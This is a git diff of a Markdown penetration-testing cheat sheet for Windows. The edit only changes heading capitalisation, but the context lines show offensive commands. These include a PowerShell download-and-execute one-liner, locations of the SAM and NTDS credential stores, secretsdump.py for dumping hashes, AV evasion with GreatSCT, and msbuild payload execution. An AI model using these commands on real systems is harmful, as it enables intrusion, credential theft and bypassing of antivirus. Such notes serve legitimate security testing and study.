@@ -1,5 +1,5 @@
 # Commands
-## User related
+## User Related
 ```powershell
 # User info
 whoami /all
@@ -47,7 +47,7 @@ Get-MpPreference | select Exclusion*
 # Download and execute files
 iex(new-object net.webclient).downloadstring('remote_file')
 ```
-### Download files
+### Download Files
 ```powershell
 # Method 1
 (new-object net.webclient).downloadfile(<remote_file>,<output_file>)
@@ -99,21 +99,21 @@ C:\Windows\System32\config
 C:\Windows\NTDS
 ```
 
-## Configuration files
+## Configuration Files
 Most config files can be found in `C:\Windows\System32\config`     
 
-### Get info from registry hive
+### Get Info From Registry Hive
 ```bash
 secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 ```
 
-## Mount windows shares and VHD files
+## Mount Windows Shares and VHD Files
 The Common Internet File System (CIFS) is a network file-sharing protocol. CIFS is a form of SMB.    
 ```bash
 mount -t cifs //<ip>/<share> <mount_dir> -o user=<username>,password=<password>
 ```
 
-### Mount VHD files
+### Mount VHD Files
 One can use `guestmount` to mount a guest filesystem on the host.     
 Install with: `apt install libguestfs-tools`
 
@@ -156,7 +156,7 @@ accesschk.exe -uwdqs "Everyone" c:\
 
 
 
-# AV evasion
+# AV Evasion
 ## GreatSCT
 ```sh
 # Download
@@ -186,7 +186,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 
 
 
-# Office files
+# Office Files
 Modern `Office` documents are just zip archives with XML files so, just unzip it and look for data within the XML files.
 ```bash
 unzip <file>
